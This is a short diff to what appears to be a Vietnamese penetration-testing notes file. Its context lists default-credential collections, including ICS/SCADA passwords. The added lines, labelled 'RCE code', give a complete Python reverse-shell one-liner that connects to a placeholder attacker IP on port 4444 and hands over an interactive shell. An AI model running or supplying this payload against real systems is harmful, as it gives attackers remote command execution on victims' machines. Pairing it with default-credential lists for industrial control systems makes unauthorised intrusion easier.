@@ -323,3 +323,6 @@ Tích hợp thuật toán mã hóa để che giấu dữ liệu khi ghi vào fil
 * **Danh sách thông tin đăng nhập mặc định:** [SecLists Default Credentials](https://github.com)
 * **Tài khoản mặc định của hệ thống điều khiển công nghiệp (ICS/SCADA):** [SCADAPASS](https://github.com)
 * **Dữ liệu tên các thành phố trên thế giới:** [World Cities Dataset](https://github.com)
+
+RCE code : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_MÁY_BẠN",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
